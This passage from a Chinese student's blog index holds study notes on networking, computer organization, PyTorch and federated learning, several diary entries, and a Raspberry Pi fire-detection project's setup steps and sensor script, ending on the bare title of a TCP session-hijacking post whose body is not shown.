Modulation)<br>为了达到更高的信息传输速率，必须采用技术上更为复杂的多元制的振幅相位混合调制方法。</p><p>不是码元越多越好。若每一个码元可表示的比特数越多，则在接收端进行解调时要正确识别每一种状态就越困难，出错率增加。</p><h3 id="2-2-3-信道的极限容量"><a href="#2-2-3-信道的极限容量" class="headerlink" title="2.2.3 信道的极限容量"></a>2.2.3 信道的极限容量</h3><p>从概念上讲，限制码元在信道上的传输速率的因素主要有两个</p><ul><li>信道能通过的频率范围<br>在接收端收到信号波形就失去了码元之间的清晰界限，这种现象叫做码间干扰。<br>1924年，奈奎斯特 (Nyquist) 就推导出了著名的奈氏准则。他给出了在假定的理想条件下，为了避免码间串扰，码元的传输速率的上限值<br>在任何信道中，码元传输的速率是有上限的，否则就会出现码间串扰的问题，使接收端对码元的判决（即识别）成为不可能。</li><li>信噪比<ul><li>噪声存在于所有的电子设备和通信信道中</li><li>噪声是随机产生的，它的瞬时值有时会很大。因此噪声会使接收端对码元的判决产生错误。</li><li>但噪声的影响是相对的。如果信号相对较强，那么噪声的影响就相对较小</li><li>信噪比就是信号的平均功率和噪声的平均功率之比。常记为 <code>S/N</code>，并用分贝 (dB) 作为度量单位。即：<script type="math/tex; mode=display">\text{信噪比(dB)} = 10\log_{10}(S/N)(dB)</script></li><li>1948年，香农 (Shannon) 用信息论的理论推导出了带宽受限且有高斯白噪声干扰的信道的极限、无差错的信息传输速率（香农公式）</li><li></li></ul></li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li>《计算机网络》(第七版)，谢希仁</li><li>《计算机网络》课件，张春元老师</li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理笔记</title>
      <link href="/blog/note-computer-organization/"/>
      <url>/blog/note-computer-organization/</url>
      
        <content type="html"><![CDATA[<p>苦b考研党要看的教材qwq<br>然鹅这个**专业居然不学计组，那学nmd计算机呢?<br>只好自学了，放假前找考研的学姐买了这本书233没花多少q<br>计算机组成原理(第5版) 白中英<br>——20200302</p><hr><hr><h1 id="第1章-计算机系统概论"><a href="#第1章-计算机系统概论" class="headerlink" title="第1章 计算机系统概论"></a>第1章 计算机系统概论</h1><h2 id="1-1-计算机的分类"><a href="#1-1-计算机的分类" class="headerlink" title="1.1 计算机的分类"></a>1.1 计算机的分类</h2><p>电子计算机总体上分为两大类：<strong>电子模拟计算机</strong>和<strong>电子数字计算机</strong><br>电子数字计算机再进一步分为<strong>专用计算机</strong>和<strong>通用计算机</strong><br>通用计算机可以分为超级计算机、大型机、服务器、PC机、单片机和多核机。<br>他们区别在于体积、简易性、功率损耗、性能指标、数据存储容量、指令系统规模和机器价格。</p><h2 id="1-2-计算机发展简史"><a href="#1-2-计算机发展简史" class="headerlink" title="1.2 计算机发展简史"></a>1.2 计算机发展简史</h2><h3 id="1-2-1-计算机的五代变化"><a href="#1-2-1-计算机的五代变化" class="headerlink" title="1.2.1 计算机的五代变化"></a>1.2.1 计算机的五代变化</h3><p>1946年世界第一台电子数字计算机在没过宾夕法尼亚大学制成。<br>第一代1946~1957，电子管计算机，计算速度?k/s~?w/s，数字处理机开始得到应用<br>第二代1958~1964，晶体管计算机，计算速度?w/s~??w/s，工业控制机开始得到应用<br>第三代1965~1971，中小型集成电路计算机，计算速度??w/s~???w/s，小型计算机开始出现<br>第四代1972~1990，大规模和超大规模集成电路计算机，计算速度????w/s~1e8/s，微型计算机开始出现<br>第五代1991年开始的巨大规模集成电路计算机，计算速度1e9/s，单片计算机开始出现</p><p>1965年摩尔观察到芯片上的晶体管数量每年翻一番，1970年这种态势减缓成每18个月翻一番，这就是<strong>摩尔定律</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> computer-organization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200125</title>
      <link href="/blog/20200125/"/>
      <url>/blog/20200125/</url>
      
        <content type="html"><![CDATA[<p>最近真的太颓了…我都快受不了自己了<br>没由头的，不想做任何事，就疯狂玩游戏麻痹自己</p><p>今天，新年第一天，也是2020年我博客的第一篇daily分类的博文<br>不奢求什么一夜暴富之类的，只希望事事顺利就好了</p><p>最近的肺炎，越来越严重，自己时不时就会去翻翻实时情况，也确实很担心<br>东营一直没有报存在病例，反而让我更加担心，怀疑是不是宣传不到位，很多老人得了都不说，以为是感冒就过去了，到时候越传越多<br>也忽然很理解那些从武汉出来的人，他们担心交叉感染，担心得不到及时的救治，于是到外省去寻求医疗救治，甚至去国外<br>结果却是，他们把病毒传播的到处都是，这也是武汉政府的失职吧<br>离开学的日子也越来越近，希望能在开学前得到控制，正常开学，因为真的很想她</p><p>总之，新的一年，希望一切就好吧！<br>不再做颓狗！</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PyTorch笔记</title>
      <link href="/blog/note-pytorch/"/>
      <url>/blog/note-pytorch/</url>
      
        <content type="html"><![CDATA[<h2 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h2><h3 id="Tensors"><a href="#Tensors" class="headerlink" title="Tensors"></a>Tensors</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a 5x3 matrix, uninitalized</span></span><br><span class="line">x = torch.empty(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a randomly initialized matrix</span></span><br><span class="line">x = torch.rand(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a matrix filled zeros and of dtype long</span></span><br><span class="line">x = torch.zeros(<span class="number">5</span>, <span class="number">3</span>, dtype=torch.long)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a tensor directly from data</span></span><br><span class="line">x = torch.tensor([<span class="number">5.5</span>, <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a tensor based on an existing tensor</span></span><br><span class="line">x = x.new_ones(<span class="number">5</span>, <span class="number">3</span>, dtype=torch.double) <span class="comment"># new_* methods take in sizes</span></span><br><span class="line">x = torch.randn_like(x, dtype=torch.float) <span class="comment"># override dtype!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get its size</span></span><br><span class="line">print(x.size())</span><br></pre></td></tr></table></figure><h3 id="Operations"><a href="#Operations" class="headerlink" title="Operations"></a>Operations</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Addition: syntax 1</span></span><br><span class="line">x + y</span><br><span class="line"></span><br><span class="line"><span class="comment"># Addition: syntax 2</span></span><br><span class="line">torch.add(x, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Addition: providing an output tensor as argument</span></span><br><span class="line">result = torch.empty(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line">torch.add(x, y, out=result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Addition: in-place</span></span><br><span class="line">y.add_(x) <span class="comment"># adds x to y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Any operation that mutates a tensor in-place is post-fixed with an _. For example: x.copy_(y), x.t_(), will change x.</span></span><br><span class="line"><span class="comment"># 就是说任何加了_的函数都会改变调用的类的数值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Resizing: If you want to resize/reshape tensor, you can use torch.view:</span></span><br><span class="line">x = torch.randn(<span class="number">4</span>, <span class="number">4</span>)</span><br><span class="line">y = x.view(<span class="number">16</span>)</span><br><span class="line">z = x.view(<span class="number">-1</span>, <span class="number">8</span>)  <span class="comment"># the size -1 is inferred from other dimensions</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you have a one element tensor, use .item() to get the value as a Python number</span></span><br><span class="line">x = torch.randn(<span class="number">1</span>)</span><br><span class="line">x.item()</span><br></pre></td></tr></table></figure><h2 id="AUTOGRAD-AUTOMATIC-DIFFERENTIATION"><a href="#AUTOGRAD-AUTOMATIC-DIFFERENTIATION" class="headerlink" title="AUTOGRAD: AUTOMATIC DIFFERENTIATION"></a>AUTOGRAD: AUTOMATIC DIFFERENTIATION</h2><h3 id="Tensor"><a href="#Tensor" class="headerlink" title="Tensor"></a>Tensor</h3><h3 id="Gradient"><a href="#Gradient" class="headerlink" title="Gradient"></a>Gradient</h3><h2 id="NEURAL-NETWORKS"><a href="#NEURAL-NETWORKS" class="headerlink" title="NEURAL NETWORKS"></a>NEURAL NETWORKS</h2><p>一个CNN的栗子<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Net</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(Net, self).__init__()</span><br><span class="line">        <span class="comment"># 1 input image channel, 6 output channels, 3x3 square convolution</span></span><br><span class="line">        <span class="comment"># kernel</span></span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">6</span>, <span class="number">16</span>, <span class="number">3</span>)</span><br><span class="line">        <span class="comment"># an affine operation: y = Wx + b</span></span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">16</span> * <span class="number">6</span> * <span class="number">6</span>, <span class="number">120</span>)  <span class="comment"># 6*6 from image dimension</span></span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="comment"># Max pooling over a (2, 2) window</span></span><br><span class="line">        x = F.max_pool2d(F.relu(self.conv1(x)), (<span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line">        <span class="comment"># If the size is a square you can only specify a single number</span></span><br><span class="line">        x = F.max_pool2d(F.relu(self.conv2(x)), <span class="number">2</span>)</span><br><span class="line">        x = x.view(<span class="number">-1</span>, self.num_flat_features(x))</span><br><span class="line">        x = F.relu(self.fc1(x))</span><br><span class="line">        x = F.relu(self.fc2(x))</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">num_flat_features</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        size = x.size()[<span class="number">1</span>:]  <span class="comment"># all dimensions except the batch dimension</span></span><br><span class="line">        num_features = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> size:</span><br><span class="line">            num_features *= s</span><br><span class="line">        <span class="keyword">return</span> num_features</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net = Net()</span><br><span class="line">print(net)</span><br></pre></td></tr></table></figure></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://pytorch.org/tutorials/beginner/deep_learning_60min_blitz.html" target="_blank" rel="noopener">DEEP LEARNING WITH PYTORCH: A 60 MINUTE BLITZ</a>, Soumith Chintala</li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> machine-learning </tag>
            
            <tag> pytorch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Federated Learning笔记</title>
      <link href="/blog/note-federated-learning/"/>
      <url>/blog/note-federated-learning/</url>
      
        <content type="html"><![CDATA[<p>独立同分布independent and identically distributed (i.i.d.)<br>非独立同分布non-IID</p><p>有一篇我自己写的小部分翻译，懒得编辑了，直接cv了</p><p>论文英文题目：Communication-Efficient Learning of Deep Networks from Decentralized Data<br>论文中译题目：一种面向分布式数据的深度网络有效通信的学习方法</p><p>英文摘要：<br>Modern mobile devices have access to a wealth of data suitable for learning models, which in turn<br>can greatly improve the user experience on the device. For example, language models can improve speech recognition and text entry, and image models can automatically select good photos. However, this rich data is often privacy sensitive, large in quantity, or both, which may preclude<br>logging to the data center and training there using conventional approaches. We advocate an alternative that leaves the training data distributed on the mobile devices, and learns a shared model by aggregating locally-computed updates. We term this decentralized approach Federated Learning. We present a practical method for the federated learning of deep networks based on iterative model averaging, and conduct an extensive empirical evaluation, considering five different model architectures and four datasets. These experiments demonstrate the approach is robust to the unbalanced and non-IID data distributions that are a defining characteristic of this setting. Communication costs are the principal constraint, and we show a reduction in required communication rounds by 10–100× as compared to synchronized stochastic gradient descent.<br>中文摘要：<br>现代移动设备可以得到适合于模型学习的大量数据，因此可以用来改善用户的使用体验。例如，语言模型可以改善语音识别和文本输入，图像模型可以自动选择优质照片。但是，这些丰富的隐私数据通常比较敏感，或者数量庞大，这可能不可以记录到数据中心并使用传统的方法在那里进行训练。我们提出另一种替代的方法，该方法将训练数据保留在移动设备上，并通过汇总本地计算的结果来更新共享模型。我们将这种分布式去中心化的方法称为联邦学习。我们提出了一种基于迭代模型平均的深度网络联邦学习的方法，并考虑了五个不同的模型架构和四个数据集，进行了广泛的经验评估。这些实验证明，该方法对于不平衡和非独立同分布的数据是稳定的，该分布是此设置的定义特征。通信成本是该方法的主要限制因素，与同步随机梯度下降相比，我们显示出所需的通信回合减少了10–100倍。</p><p>核心内容：<br>Federated Learning<br>Ideal problems for federated learning have the following properties: 1) Training on real-world data from mobile devices provides a distinct advantage over training on proxy data that is generally available in the data center. 2) This data is privacy sensitive or large in size (compared to the size of the model), so it is preferable not to log it to the data center purely for the purpose of model training (in service of the focused collection principle). 3) For supervised tasks, labels on the data can be inferred naturally from user interaction. Many models that power intelligent behavior on mobile devices fit the above criteria. As two examples, we consider image classification, for example predicting which photos are most likely to be viewed multiple times in the future, or shared; and language models, which can be used to improve voice recognition and text entry on touch-screen keyboards by improving decoding, next-word-prediction, and even predicting whole replies.<br>理想的联邦学习的问题具有以下特性：1）对来自移动设备的现实世界数据进行的训练比对数据中心中通常可用的替代数据的培训具有明显的优势。 2）此数据是隐私敏感的或较大的（与模型的大小相比），因此最好不要仅出于训练模型的目的将其记录到数据中心（以集中收集为原则）。 3）对于监督学习，可以从用户交互中自然推断出数据上的标签。支持移动设备上智能服务的许多模型都符合上述条件。举两个例子，我们考虑图像分类，例如预测哪些照片将来最有可能被多次查看或共享；语言模型，可以通过改善解码，下一单词预测甚至预测整个回复来改善触摸屏键盘上的语音识别和文本输入。</p><p>The FederatedAveraging Algorithm<br>We term this approach FederatedAveraging(or FedAvg). The amount of computation is controlled<br>by three key parameters: C, the fraction of clients that perform computation on each round; E, then number of training passes each client makes over its local dataset on each round; and B, the local minibatch size used for the client updates. We write B = ∞ to indicate that the full local dataset is treated as a single minibatch. Thus, at one endpoint of this algorithm family, we can take B = ∞ and E = 1 which corresponds exactly to FedSGD. For a client with n_k local examples, the number of local updates per round is given by u_k = E* n_k/B; Complete pseudo-code is given in Algorithm 1.<br>我们称这种方法为FederatedAveraging（或FedAvg）。 计算量受控于三个关键参数：C，每一轮执行计算的客户比例； E，然后每个客户在每个回合中对其本地数据集进行的训练次数； 和B，用于客户端更新的本地最小数据量大小。 我们写B =∞表示整个本地数据集被视为单个数据量。 因此，在该算法族的一个端点，我们可以取B =∞和E = 1，这恰好对应于FedSGD。 对于具有n_k个本地示例的客户端，每轮本地更新次数由u_k = E * n_k / B给出； 算法1中给出了完整的伪代码。<br><img src="/img/note-federated-learning/algro.png" alt><br>算法流程主要是初始化服务端模型，随机选取m个客户端，对于选中的客户端用其参数对服务器模型进行更新，同时传输给客户端。对于客户端，利用本地数据更新模型，将参数传给服务端。</p><p>FedSGD算法和FedAvg算法在CIFAR-10图片分类上的对比实验结果，可以看到FedAvg效果要明显优于FedSGD算法的效果</p><p>简单的来说，联邦学习可以减少数据通信的传输量同时保护用户隐私，做到数据隔离，且能达到较好的训练结果。</p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> mathine-learning </tag>
            
            <tag> federated-learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20191201</title>
      <link href="/blog/20191201/"/>
      <url>/blog/20191201/</url>
      
        <content type="html"><![CDATA[<p>如何1s中损失200rmb？<br>你只需要把你的树莓派短接1s，它就没啦！<br>记录一下悲惨的时刻…<br>创马提供的Micarduino Sensor Hub并不是和树莓派配套的扩展板，我天真以为是和树莓派配套的hhh<br>然后没有Arduino Core也就控制不了，然后尝试用杜邦线直接连…<br>就在这过程中，我把I2C的线当成的GND！我先接了VCC(因为好接)！然后！<br>SSH就断开了！<br>再然后！他开始嗡嗡叫了！<br>再然后！他只有红灯亮！打不开了！<br>然后我把SD卡放我3B+上了，可以打开系统<br>基本可以确定他gg了…R.I.P.</p><p>谨此文警示众人，不要先接电源！！！看好线再接！！！<br>第一次因为接错线短路烧了一个板子..<br>强烈希望树莓派加一个控制GPIO电源的开关..哪怕是命令也好…(也可能有，但是我不知道hhh)</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于树莓派的火焰识别智能家居</title>
      <link href="/blog/iot-fire-dection-based-on-raspberry-pi/"/>
      <url>/blog/iot-fire-dection-based-on-raspberry-pi/</url>
      
        <content type="html"><![CDATA[<p>这是我创马的项目，到时候会把所有代码丢上来<br>为了方便复现和后面分享hhh</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>烧录系统他都烧好了，建两个文件，一个空文件ssh来开启SSH(不要加后缀)，一个<code>wpa_supplicant.conf</code>来开启WiFi<br>文件内容<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">country=CN</span><br><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line"></span><br><span class="line">network=&#123;</span><br><span class="line">    ssid=<span class="string">"youareajunneke"</span></span><br><span class="line">    psk=<span class="string">"tongxingjiaoyou"</span></span><br><span class="line">    key_mgmt=WPA-PSK</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>打开我用路由器管理查的ip</p><p>默认账号pi 默认密码raspberry 默认主机名raspberrypi<br>先改密码<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure></p><p>pip源<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">清华:https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">阿里云:https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">中国科技大学:https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class="line">华中理工大学:https://pypi.hustunique.com/</span><br><span class="line">山东理工大学:https://pypi.sdutlinux.org/ </span><br><span class="line">豆瓣:https://pypi.douban.com/simple/</span><br></pre></td></tr></table></figure></p><p>vi用的太不爽了下个vim<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure></p><p>安装keras&amp;tensorflow&amp;opencv<br>ps. 果然出啥问题还是得google.hhhh.baidu太辣鸡了<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple <span class="comment"># 修改源</span></span><br><span class="line">sudo apt-get install python3-scipy <span class="comment"># 因为pip安装太慢了</span></span><br><span class="line">sudo apt-get install libhdf5-serial-dev</span><br><span class="line">sudo pip3 install tensorflow <span class="comment"># 这个安装真的迷，因为没有国内源，所以晚上下载特别慢，第二天早上就贼快</span></span><br><span class="line">sudo pip3 install keras</span><br><span class="line">sudo pip3 install opencv-python==3.4.6.27 <span class="comment"># 最新版opencv居然不支持树莓派，我人傻了</span></span><br></pre></td></tr></table></figure></p><p>其他我需要的东西<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install scikit-image</span><br><span class="line">sudo pip3 install imutils</span><br></pre></td></tr></table></figure></p><p>还有其他的配置<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo raspi-config</span><br><span class="line"><span class="comment"># -&gt; Interfacing Opinions -&gt; camera &amp; SSH &amp; I2C enable</span></span><br></pre></td></tr></table></figure></p><p>每次环境配置都是最令人自闭的hhh</p><h2 id="硬件相关"><a href="#硬件相关" class="headerlink" title="硬件相关"></a>硬件相关</h2><p>我以为创新院给的SensorHub会是和树莓派配套的扩展板…没想到并不是这样0.0</p><h3 id="MQ-2"><a href="#MQ-2" class="headerlink" title="MQ-2"></a>MQ-2</h3><p>先装个简单的吧<br>倒过来从左到右<br>AD - None<br>DO - GPIOPIN<br>GND - GND<br>VCC - 5V<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CHANNEL=<span class="number">7</span></span><br><span class="line">GPIO.setmode(GPIO.BOARD)</span><br><span class="line">GPIO.setup(CHANNEL,GPIO.IN,pull_up_down=GPIO.PUD_DOWN)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        status=GPIO.input(CHANNEL)</span><br><span class="line">        print(status) <span class="comment"># 实时打印此时的电平状态</span></span><br><span class="line">        <span class="keyword">if</span> status == <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'ok'</span>)      </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'danger gas'</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    GPIO.cleanup()</span><br></pre></td></tr></table></figure></p><h3 id="火焰检测器"><a href="#火焰检测器" class="headerlink" title="火焰检测器"></a>火焰检测器</h3><p>和MQ-2差不多<br>DO - GPIOPIN<br>GND - GND<br>VCC - 3V</p><h2 id="模型设计"><a href="#模型设计" class="headerlink" title="模型设计"></a>模型设计</h2><h2 id="图像预处理"><a href="#图像预处理" class="headerlink" title="图像预处理"></a>图像预处理</h2><h2 id="实时展示"><a href="#实时展示" class="headerlink" title="实时展示"></a>实时展示</h2><p>创建web服务器，HTTPStream实时显示</p><h2 id="成品"><a href="#成品" class="headerlink" title="成品"></a>成品</h2><p>用点工具把文件传到树莓派，sftp的工具都行，putty有，xftp啥的<br>记得把<code>imshow</code>注释掉哦</p><h2 id="视频录制与剪辑"><a href="#视频录制与剪辑" class="headerlink" title="视频录制与剪辑"></a>视频录制与剪辑</h2><ul><li>用Keras建立模型</li><li>用网络上收集的数据集训练</li><li>在电脑上测试</li><li>移植到树莓派上</li><li>在树莓派上构建web服务器，可以在用户终端上实时显示数据</li><li>传感模块连接</li><li>传感模块测试</li><li>最终成品</li></ul><h2 id="项目计划书"><a href="#项目计划书" class="headerlink" title="项目计划书"></a>项目计划书</h2><h2 id="PPT与答辩稿"><a href="#PPT与答辩稿" class="headerlink" title="PPT与答辩稿"></a>PPT与答辩稿</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h3 id="dataset"><a href="#dataset" class="headerlink" title="dataset"></a>dataset</h3><ul><li><a href="https://github.com/tobybreckon/fire-detection-cnn" target="_blank" rel="noopener">https://github.com/tobybreckon/fire-detection-cnn</a></li><li><a href="http://smoke.ustc.edu.cn/datasets.htm" target="_blank" rel="noopener">http://smoke.ustc.edu.cn/datasets.htm</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> machinelearning </tag>
            
            <tag> iot </tag>
            
            <tag> raspberry </tag>
            
            <tag> python </tag>
            
            <tag> sensorhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20191121</title>
      <link href="/blog/20191121/"/>
      <url>/blog/20191121/</url>
      
        <content type="html"><![CDATA[<p>Why not start from now?</p><p>我一直觉得我很忙，总有各种各样的事情<br>但是同样的时间为什么别人可以做的更多？<br>所以我就在找我在哪里浪费了时间</p><p>我发现浪费时间最多的地方就是课堂…<br>不知道我已经没听过概率统计多少节课了，<br>不知道我已经没听过离散数学多少节课了，<br>不知道我已经没听过马克思主义原理多少节课了，<br>不知道我已经没听过HBase多少节课了，<br>不知道我已经没听过Hadoop多少节课了，<br>不知道我已经没听过数据结构多少节课了…</p><p>我还有什么课呢…<br>总想着，<strong>等到最后一起复习一下就行了</strong><br>可是，这些复习的时间我又从哪搞来呢？<br>So, why not start from now?</p><p>看了别人，才发现自己是多么渺小<br>不仅问自己，你呢？</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次TCP会话劫持实验</title>
      <link href="/blog/hack-tcp-session-hijack/"/>
      <url>/blog/hack-tcp-session-hijack/</url>
      
